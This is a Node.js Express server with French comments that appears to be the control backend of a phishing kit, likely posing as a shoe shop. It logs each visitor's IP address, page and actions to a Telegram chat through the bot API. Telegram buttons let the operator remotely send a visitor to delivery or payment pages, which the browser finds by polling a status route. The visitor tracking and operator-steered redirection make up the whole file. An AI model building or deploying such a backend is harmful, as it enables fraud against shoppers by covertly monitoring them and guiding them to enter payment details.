const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');
const fetch = require('node-fetch');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('⚠️ BOT_TOKEN ou CHAT_ID non défini sur Render');
}

const sessions = {};

// Fonction d'envoi de notification Telegram
async function sendTelegramNotif(data) {
  let msg = `👟 <b>Nouvelle interaction</b>\n`;
  msg += `🆔 <b>Session :</b> ${data.sessionId}\n`;
  if (data.page) msg += `📄 <b>Page :</b> ${data.page}\n`;
  if (data.action) msg += `🪄 <b>Action :</b> ${data.action}\n`;
  msg += `🕓 ${new Date().toLocaleString()}`;

  const keyboard = [
    [{ text: '🏠 Accueil', callback_data: 'go|accueil|' + data.sessionId }],
    [{ text: '📦 Livraison', callback_data: 'go|livraison|' + data.sessionId }],
    [{ text: '💳 Paiement', callback_data: 'go|paiement|' + data.sessionId }]
  ];

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: msg,
      parse_mode: 'HTML',
      reply_markup: { inline_keyboard: keyboard }
    })
  });
}

// Page d'accueil : nouvelle session
app.get('/api/visit', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const sid = uuidv4();
  sessions[sid] = { data: { sessionId: sid, ip, page: 'Accueil', action: 'Nouvel utilisateur' }, redirect: null };
  sendTelegramNotif(sessions[sid].data);
  res.json({ sessionId: sid });
});

// Mise à jour action utilisateur
app.post('/api/action', (req, res) => {
  const { sessionId, page, action } = req.body;
  if (!sessions[sessionId]) return res.status(400).send('Session invalide');
  sessions[sessionId].data.page = page;
  sessions[sessionId].data.action = action;
  sendTelegramNotif(sessions[sessionId].data);
  res.json({ ok: true });
});

// Route appelée par le bot Telegram
app.post('/telegramWebhook', express.json(), async (req, res) => {
  const body = req.body;

  if (body.callback_query) {
    const cb = body.callback_query;
    const [cmd, page, sid] = cb.data.split('|');
    if (cmd === 'go' && sessions[sid]) {
      sessions[sid].redirect = page;
      sessions[sid].data.action = `Redirigé vers ${page}`;
      await sendTelegramNotif(sessions[sid].data);
    }

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: cb.id, text: `Redirection envoyée` })
    });
  }

  res.sendStatus(200);
});

// Vérification périodique du statut (redirection distante)
app.get('/api/status', (req, res) => {
  const { sessionId } = req.query;
  if (!sessions[sessionId]) return res.json({ redirect: null });
  const redirect = sessions[sessionId].redirect;
  sessions[sessionId].redirect = null; // reset après lecture
  res.json({ redirect });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Serveur en ligne sur le port ${PORT}`));
